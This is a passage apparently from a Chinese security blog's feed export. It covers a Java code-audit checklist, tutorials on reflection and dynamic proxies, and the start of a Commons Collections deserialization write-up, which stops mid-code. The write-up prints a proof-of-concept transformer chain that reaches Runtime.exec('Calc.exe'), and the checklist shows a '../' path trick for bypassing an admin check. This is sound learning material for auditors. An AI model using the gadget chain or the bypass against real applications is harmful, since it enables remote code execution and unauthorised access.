href="#审计-v6">¶</a>审计</h3><ol><li>搜索<code>File</code>、<code>getPath</code>、<code>getAbsolutePath</code>、<code>entry.getName</code>、<code>multipartFile.getOriginalFilename</code>等关键字，定位操作文件的代码块；</li><li>检查实例化File时，Path参数是否拼接用户输入，或者用户输入是否对特殊字符进行过滤或转译；</li><li>检查在进行路径校验时，是否使用<code>getAbsolutePath</code>并结合<code>indexOf</code>、<code>startsWith</code>等部分匹配函数进行路径校验；</li><li>对于压缩解压操作，检查是否直接使用<code>entry.getName</code>拼接保存路径</li><li>若实例化File的参数用户可控，且调用栈中没有进行过滤或转义，则存在路径穿越漏洞；</li><li>若使用<code>getAbsolutePath</code>并结合<code>indexOf</code>、<code>startsWith</code>等部分匹配函数进行路径校验，将导致校验函数被绕过，存在路径穿越漏洞（应使用<code>getCanonicalPath</code>函数）</li><li>若解压文件时直接使用<code>entry.getName</code>拼接保存路径，且后续不再校验路径，则存在路径穿越漏洞。</li></ol><h2 id="任意文件上传"><a class="header-anchor" href="#任意文件上传">¶</a>任意文件上传</h2><p>任意文件覆盖似乎也是这个</p><h3 id="特征-v12"><a class="header-anchor" href="#特征-v12">¶</a>特征</h3><p>需注意有没有配置文件上传白名单</p><p><code>MultipartFile</code>、<code>FileItem</code>、<code>upload</code>、<code>transferTo</code>，<code>write</code>,<code>fileName</code> ,<code>filePath</code></p><h3 id="审计-v7"><a class="header-anchor" href="#审计-v7">¶</a>审计</h3><ol><li>搜索<code>MultipartFile</code>、<code>FileItem</code>、<code>upload</code>、<code>transferTo</code>等关键字，定位实现文件上传的代码块；</li><li>检查代码中是否对文件保存路径进行限制（参考路径穿越章节）；</li><li>检查代码中是否对文件类型进行校验；</li><li>检查文件类型校验是否可绕过，内容包括但不限于以下几个小类：使用黑名单还是白名单校验，黑名单是否完备；使用文件后缀还是MIME获取文件类型；使用后缀名校验文件类型时，是否正确取后缀；是否对大小写进行统一后再校验</li><li>若文件类型没有校验，则存在任意文件上传漏洞；</li><li>文件类型黑名单，或大小写未统一，存在遗漏，则存在漏洞；</li></ol><h2 id="SSRF"><a class="header-anchor" href="#SSRF">¶</a>SSRF</h2><h3 id="特征-v13"><a class="header-anchor" href="#特征-v13">¶</a>特征</h3><p><code>URLConnection</code>、<code>HTTPConnection</code></p><h3 id="审计-v8"><a class="header-anchor" href="#审计-v8">¶</a>审计</h3><ol><li>搜索<code>URLConnection</code>、<code>HTTPConnection</code>等关键字，定位发起服务端请求的代码块；</li><li>检查目标地址URL是否用户可控，是否对目标地址合法性进行检查；</li><li>检查目标地址合法性时，是否使用<code>startsWith</code>、<code>indexOf</code>等部分匹配</li><li>若<code>HTTPConnection</code>、<code>URLConnection</code>的目标地址用户可控，且校验函数可绕过，则存在SSRF漏洞。</li></ol><h2 id="序列化漏洞"><a class="header-anchor" href="#序列化漏洞">¶</a>序列化漏洞</h2><h3 id="特征-v14"><a class="header-anchor" href="#特征-v14">¶</a>特征</h3><p>反序列化操作一般在导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁 盘或 DB 存储等业务场景,在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控</p><p>反序列化漏洞关键字：<code>ObjectInputStream</code>、<code>ObjectOutputStream</code>、<code>serializable</code>、<code>readOject</code>、<code>readExternal</code></p><p><code>ObjectInputStream.readObject</code><code>ObjectInputStream.readUnshared</code><code>XMLDecoder.readObject</code><code>Yaml.load</code><code>XStream.fromXML</code><code>ObjectMapper.readValue</code><code>JSON.parseObject</code></p><h3 id="审计-v9"><a class="header-anchor" href="#审计-v9">¶</a>审计</h3><ol><li>搜索实现<code>serializable</code>或<code>external</code>的接口，检查<code>readOject</code>、<code>readExternal</code>等函数中是否进行了危险操作（如删除文件，调用系统命令等）</li><li>搜索关键字<code>ObjectInputStream.readObject</code>，检查对数据进行反序列化时，是否对数据进行安全校验（如是否重写了<code>resolveClass</code>并自定义白名单、使用IO流过滤器）</li><li>如果程序读取输入流并将其反序列化为对象, 此时可查看项目工程中是否引入可利 用的 commons-collections 3.1、commons-fileupload 1.3.1 等第三方库</li></ol><h2 id="文件包含"><a class="header-anchor" href="#文件包含">¶</a>文件包含</h2><h3 id="特征-v15"><a class="header-anchor" href="#特征-v15">¶</a>特征</h3><p><code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>等</p><h3 id="审计-v10"><a class="header-anchor" href="#审计-v10">¶</a>审计</h3><ol><li>在jsp、jspx中搜索关键字include；</li><li>被包含的文件是否用户可控，是否限定在特定的目录下；</li><li>若包含的文件用户完全可控，没有路径限制，则存在任意文件包含漏洞；</li></ol><h2 id="缓冲区溢出"><a class="header-anchor" href="#缓冲区溢出">¶</a>缓冲区溢出</h2><p>主要通过搜索关键词定位，再分析上下文可搜索以下关键字：<code>strcpy</code>,<code>strcat</code>,<code>scanf</code>,<code>memcpy</code>,<code>memmove</code>,<code>memeccpy Getc()</code>,<code>fgetc()</code>,<code>getchar</code>;<code>read</code>,<code>printf</code></p><h2 id="不安全的第三方组件"><a class="header-anchor" href="#不安全的第三方组件">¶</a>不安全的第三方组件</h2><h3 id="审计-v11"><a class="header-anchor" href="#审计-v11">¶</a>审计</h3><ol><li>获取项目的依赖文件（如pom.xml、lib文件夹）</li><li>检查项目依赖的第三方组件是否为存在漏洞的版本</li><li>由于第三方组件漏洞在持续更新，建议对第三方组件漏洞进行持续跟踪</li></ol><p>安卓:通过查看配置文件<code>AndroidManifest.xml</code>,查看<code>&lt;inter-filter&gt;</code>属性有没有配置 <code>false</code>, 如没有配置, 默认组件可被导出</p><p><code>ObjectInputStream.readObject</code><code>ObjectInputStream.readUnshared</code><code>XMLDecoder.readObject</code><code>Yaml.load</code><code>XStream.fromXML</code><code>ObjectMapper.readValue</code><code>JSON.parseObject</code><code>Serializable</code></p><p><code>commons-io 2.4</code><code>commons-collections 3.1</code><code>commons-logging 1.2</code><code>commons-beanutils 1.9.2</code><code>org.slf4j:slf4j-api 1.7.21</code><code>com.mchange:mchange-commons-java 0.2.11</code><code>org.apache.commons:commons-collections 4.0</code><code>com.mchange:c3p0 0.9.5.2</code><code>org.beanshell:bsh 2.0b5</code><code>org.codehaus.groovy:groovy 2.3.9</code><code>org.springframework:spring-aop4.1.4.RELEASE</code></p><h1>逻辑漏洞</h1><h2 id="水平越权"><a class="header-anchor" href="#水平越权">¶</a>水平越权</h2><p>水平越权本身没有特定的关键字，应在审计过程中关注系统业务逻辑</p><p>重点关注用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存在漏洞，有些厂商会使用一些主流的权限框架，例如 <code>shiro</code> ,<code>spring security</code> 等框架，那么需要重点关注框架的配置文件以及实现方法</p><h3 id="审计-v12"><a class="header-anchor" href="#审计-v12">¶</a>审计</h3><ol><li>对业务功能的逻辑处理流程进行梳理，分析流程中是否判断了请求与请求发起者之间的绑定关系。</li><li>找到一个功能点，检查请求参数中是否包含了可以验证用户身份的信息，如短信验证码。然后，分析该功能的处理逻辑中是否对用户标识（userID等）进行了判断，检查该用户标识是否用户可控。</li><li>当该功能未判断请求与请求发起者之间的绑定关系，或用于判断绑定关系的各参数用户可控（cookie中的未加密内容，Http请求头中的内容，Http正文中的内容一般都认为是用户可控内容），则该功能存在水平越权漏洞。</li></ol><h2 id="垂直越权"><a class="header-anchor" href="#垂直越权">¶</a>垂直越权</h2><p>同上</p><p>搜索关键字<code>getRequestURI</code>，发现该<code>/add/user</code>接口通过<code>getRequestURI</code>方法获取当前URL，若<code>getRequestURI</code>返回值以admin开头。则要求session中admin取值为admin，才能访问URL。但是<code>getRequestURI</code>和<code>startsWith</code>联合使用时，可以通过<code>/aaa/bbb/../../admin/add/user</code>，来调用<code>/admin/add/user</code>接口</p><h1>其他漏洞审计方法</h1><h2 id="csrf"><a class="header-anchor" href="#csrf">¶</a>csrf</h2><h3 id="特征-v16"><a class="header-anchor" href="#特征-v16">¶</a>特征</h3><p>通过查看配置文件有没有配置 csrf 全局过滤器，如果没有则重点看每个操作前有没有添加 token 的防护机制</p><h2 id="会话超时设置"><a class="header-anchor" href="#会话超时设置">¶</a>会话超时设置</h2><p>Javaweb 应用会话超时设置一般有俩种方法：</p><p>一是在配置文件 <code>web.xml</code> 设置</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>15<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>二是通过 java 代码设置</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">session.setMaxInactiveInterval(<span class="number">60</span>); <span class="comment">// 单位: 秒</span></span><br></pre></td></tr></table></figure><h2 id="敏感数据弱加密"><a class="header-anchor" href="#敏感数据弱加密">¶</a>敏感数据弱加密</h2><blockquote><p>不需要写入报告中</p></blockquote><p>看看数据传输中的加密方法, 不能仅用base64, 可以用换表base64嘛</p><h2 id="session"><a class="header-anchor" href="#session">¶</a>session</h2><p>成功登陆之后是否会更新SessionIDsession是否有超时注销功能</p><h2 id="cookie"><a class="header-anchor" href="#cookie">¶</a>cookie</h2><p>是否设置了Cookie的httponly属性是否在cookie中设置明文的用户名或用户编号，且服务端根据该信息来鉴权。</p><h2 id="密码管理"><a class="header-anchor" href="#密码管理">¶</a>密码管理</h2><p>密码是否以不可逆的哈希形态存储是否使用不带salt的哈希算法来加密密码加密哈希算法中的salt是否硬编码在代码中</p><p>检查密码修改功能请求中是否有用户名或用户编号，且服务端以该参数来选择需要修改密码的用户，如有则存在越权</p><h1>高危组件漏洞</h1><h2 id="shiro"><a class="header-anchor" href="#shiro">¶</a>shiro</h2><h2 id="Weblogic"><a class="header-anchor" href="#Weblogic">¶</a>Weblogic</h2><h2 id="Fastjson"><a class="header-anchor" href="#Fastjson">¶</a>Fastjson</h2><p><code>parse</code> 和 <code>parseObject</code></p><h2 id="Struts2"><a class="header-anchor" href="#Struts2">¶</a>Struts2</h2>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/article/Java-ref/"/>
      <url>/article/Java-ref/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>先讲一下Java类动态加载方式</p><h1>Java类动态加载方式</h1><p>Java类加载方式分为显式和隐式</p><ul><li>显式即我们通常使用Java反射或者<code>ClassLoader</code>来动态加载一个类对象</li><li>隐式指的是<code>类名.方法名()</code>或<code>new</code>类实例</li></ul><h2 id="显式加载"><a class="header-anchor" href="#显式加载">¶</a>显式加载</h2><p><code>Class.forName()</code>方式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 默认初始化类</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制初始化的重载方法</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(</span><br><span class="line">    <span class="string">&quot;com.example.MyClass&quot;</span>, </span><br><span class="line">    <span class="literal">false</span>, <span class="comment">// 是否初始化</span></span><br><span class="line">    Thread.currentThread().getContextClassLoader()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>ClassLoader.loadClass()</code>方式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用系统类加载器</span></span><br><span class="line">Class&lt;?&gt; clazz = ClassLoader.getSystemClassLoader()</span><br><span class="line">    .loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用当前类加载器</span></span><br><span class="line">Class&lt;?&gt; clazz = getClass().getClassLoader()</span><br><span class="line">    .loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>Class.forName(&quot;类名&quot;)</code>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<code>Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)</code></p><p>若用<code>ClassLoader.loadClass</code>, 该方式默认不会初始化类方法</p><h2 id="隐式加载"><a class="header-anchor" href="#隐式加载">¶</a>隐式加载</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassName.staticMethod()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>()</span><br></pre></td></tr></table></figure><p><code>Class.forName(&quot;类名&quot;)</code>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<code>Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)</code>，而<code>ClassLoader.loadClass</code>默认不会初始化类方法。</p><h1>反射是什么</h1><p><strong>反射</strong>: Java在运行时动态获取类信息、操作类属性和方法的能力</p><h1>如何获取一个对象</h1><ol><li>获取类的 Class 对象实例</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.zhenai.api.Apple&quot;</span>);</span><br></pre></td></tr></table></figure><ol start="2"><li>根据 CLass 对象实例获取 Constructor 对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">appleConstructor</span> <span class="operator">=</span> clz.getConstructor();</span><br></pre></td></tr></table></figure><ol start="3"><li>使用 Constructor 对象的 newInstance 方法获取反射类对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">appleObj</span> <span class="operator">=</span> appleConstructor.newInstance();</span><br></pre></td></tr></table></figure><h1>如何调用某一个方法</h1><ol><li>获取方法的 Method 对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">setPriceMethod</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;setPrice&quot;</span>, <span class="type">int</span>.class);</span><br></pre></td></tr></table></figure><ol start="2"><li>利用 invoke 方法调用方法</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setPriceMethod.invoke(appleObj, <span class="number">14</span>);</span><br></pre></td></tr></table></figure><p>特点:</p><ul><li>突破封装性：可访问私有成员（需setAccessible(true)）</li><li>动态性：运行时才确定操作对象（如<code>Class.forName(&quot;java.lang.Runtime&quot;</code>方法)）</li><li>自省能力：可获取类结构（方法、字段、注解等）</li></ul><blockquote><p>反射使攻击者能绕过Java的访问控制，操作<code>Runtime</code>等敏感类。</p></blockquote><table><thead><tr><th>术语</th><th>作用</th><th>漏洞利用中的角色</th></tr></thead><tbody><tr><td>反射</td><td>运行时动态操作类</td><td>突破Java安全机制的基础能力</td></tr><tr><td>反射获取方法</td><td>提取类中的特定方法</td><td>获取敏感方法（如 <code>getRuntime</code>）</td></tr><tr><td>反射调用</td><td>动态执行方法</td><td>触发命令执行（如 <code>exec()</code>)</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代理</title>
      <link href="/article/Java-agent/"/>
      <url>/article/Java-agent/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ol><li><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html">博客园-java动态代理实现与原理详细分析</a></li></ol><h1>前置知识</h1><p>代理很简单, 就是引入一个中间人; 这个中间人不仅用于传递信息, 还可以进行过滤/其他调用等操作</p><p>这就好比 我通过朋友向老师提交作业, 朋友可能会顺一瓶可乐回来, 或者和老师聊聊天, 说说我的好话和坏话</p><p>代理组成:</p><ul><li>Subject：抽象主题（接口）</li><li>RealSubject：真实主题（实现类）</li><li>Proxy：代理类（控制对真实主题的访问）</li></ul><h1>动态和静态代理</h1><p>静态代理, 在编译时就已经将接口, 被代理类等确定下来; 在程序运行之前, 代理类的.class文件就已经生成</p><p>动态代理: 代理类在程序运行时创建的代理方式被成为动态代理; 动态代理的优势在于可以很方便的对代理类的函数进行统一的处理, 而不用修改每个代理类中的方法</p><p>核心类与接口</p><ul><li><code>java.lang.reflect.Proxy</code>：动态代理的主类</li><li><code>java.lang.reflect.InvocationHandler</code>：调用处理器接口</li></ul><h2 id="例子"><a class="header-anchor" href="#例子">¶</a>例子</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 定义业务接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 实现业务接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RealService</span> <span class="keyword">implements</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;真实服务执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 实现调用处理器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ServiceHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target; <span class="comment">// 被代理对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span><br><span class="line">        <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;前置处理&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args); <span class="comment">// 调用真实方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;后置处理&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 创建动态代理</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建真实对象</span></span><br><span class="line">        <span class="type">Service</span> <span class="variable">realService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealService</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建调用处理器</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceHandler</span>(realService);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建代理对象</span></span><br><span class="line">        <span class="type">Service</span> <span class="variable">proxy</span> <span class="operator">=</span> (Service) Proxy.newProxyInstance(</span><br><span class="line">            Service.class.getClassLoader(), <span class="comment">// 类加载器</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Service.class&#125;,    <span class="comment">// 代理接口数组</span></span><br><span class="line">            handler                        <span class="comment">// 调用处理器</span></span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 通过代理调用方法</span></span><br><span class="line">        proxy.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法调用流程</p><p><img src="../../../../image/JavaReflection.png" alt="JavaReflection"></p><h2 id="代理类生成过程"><a class="header-anchor" href="#代理类生成过程">¶</a>代理类生成过程</h2><ul><li>根据接口信息生成代理类的字节码</li><li>使用类加载器加载生成的代理类</li><li>通过反射创建代理类实例</li></ul><h2 id="代理使用条件"><a class="header-anchor" href="#代理使用条件">¶</a>代理使用条件</h2><ul><li>目标包含invoke</li><li>invoke方法中调用get</li><li>readObject调用已有方法</li></ul><h1>重点</h1><p>执行被代理对象的任何方法都会先触发代理类的invoke方法, 你从上面的方法调用流程可以很直观的看出来</p><p>嗯, 这里好像可以利用反序列化哦</p>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons Collections迭代调用链</title>
      <link href="/article/cc1-basic/"/>
      <url>/article/cc1-basic/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ol><li><a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">大白话说Java反射：入门、使用、原理</a></li><li><a href="https://www.runoob.com/java/java-reflection.html">菜鸟教程-Java反射</a></li><li><a href="https://blog.csdn.net/qq_36869808/article/details/121105988">csdn-反序列化调用链——Commons Collections 迭代调用链</a></li></ol><h1>前置知识</h1><p><strong>反射</strong>: Java在运行时动态获取类信息、操作类属性和方法的能力</p><p>如何获取一个对象:</p><ol><li>获取类的 Class 对象实例</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.zhenai.api.Apple&quot;</span>);</span><br></pre></td></tr></table></figure><ol start="2"><li>根据 CLass 对象实例获取 Constructor 对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">appleConstructor</span> <span class="operator">=</span> clz.getConstructor();</span><br></pre></td></tr></table></figure><ol start="3"><li>使用 Constructor 对象的 newInstance 方法获取反射类对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">appleObj</span> <span class="operator">=</span> appleConstructor.newInstance();</span><br></pre></td></tr></table></figure><p>如何调用某一个方法:</p><ol><li>获取方法的 Method 对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">setPriceMethod</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;setPrice&quot;</span>, <span class="type">int</span>.class);</span><br></pre></td></tr></table></figure><ol start="2"><li>利用 invoke 方法调用方法</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setPriceMethod.invoke(appleObj, <span class="number">14</span>);</span><br></pre></td></tr></table></figure><p>特点:</p><ul><li>突破封装性：可访问私有成员（需setAccessible(true)）</li><li>动态性：运行时才确定操作对象（如<code>Class.forName(&quot;java.lang.Runtime&quot;</code>方法)）</li><li>自省能力：可获取类结构（方法、字段、注解等）</li></ul><blockquote><p>反射使攻击者能绕过Java的访问控制，操作<code>Runtime</code>等敏感类。</p></blockquote><table><thead><tr><th>术语</th><th>作用</th><th>漏洞利用中的角色</th></tr></thead><tbody><tr><td>反射</td><td>运行时动态操作类</td><td>突破Java安全机制的基础能力</td></tr><tr><td>反射获取方法</td><td>提取类中的特定方法</td><td>获取敏感方法（如 <code>getRuntime</code>）</td></tr><tr><td>反射调用</td><td>动态执行方法</td><td>触发命令执行（如 <code>exec()</code>)</td></tr></tbody></table><h1>迭代链</h1><h2 id="poc"><a class="header-anchor" href="#poc">¶</a>poc</h2><p>POC如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 创建Transformer链数组（关键恶意操作序列）</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">    <span class="comment">// 固定返回Runtime类的Class对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,  </span><br><span class="line">        <span class="comment">// 方法参数类型</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">        <span class="comment">// 获取getRuntime方法</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,  </span><br><span class="line">        <span class="comment">// 方法参数类型</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),        </span><br><span class="line">        <span class="comment">// 调用getRuntime()获取Runtime实例</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,                 </span><br><span class="line">        <span class="comment">// 方法参数类型</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;)                  </span><br><span class="line">        <span class="comment">// 执行系统命令</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是手动触发transfrom迭代链的方法</p><ul><li>拿到对应类</li><li>反射获取方法</li><li>执行方法</li><li>触发</li></ul><p>一般来说真实情况会是下面这样</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i)&#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看不懂吗, 看不懂就对了</p><blockquote><p>每个 <code>InvokerTransformer</code> 只能执行一个方法调用。要执行复杂操作，需要将多个转换器连接起来</p></blockquote><h2 id="获取目标类"><a class="header-anchor" href="#获取目标类">¶</a>获取目标类</h2><p>我们可以通过<code>ConstantTransformer</code>类中的transform方法来获取类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object o=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(Object.class); System.out.println(o);</span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br></pre></td></tr></table></figure><p><code>ConstantTransformer</code>实现了<code>Transformer</code>接口，重写了transform, 直接来看重写的内容, 发现可以获取到对应的类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取目标类方法"><a class="header-anchor" href="#获取目标类方法">¶</a>获取目标类方法</h2><p>获取目标类的方式使用的<code>InvokerTransformer</code>, <code>InvokerTransformer</code>类的主要作用就是利用Java反射机制来创建类实例</p><p><code>Transformer</code>方法是直接调用反射机制来获取到方法的实例</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 此处调用反射机制</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(methodName, paramTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(...);</span><br><span class="line">        &#125;</span><br><span class="line">    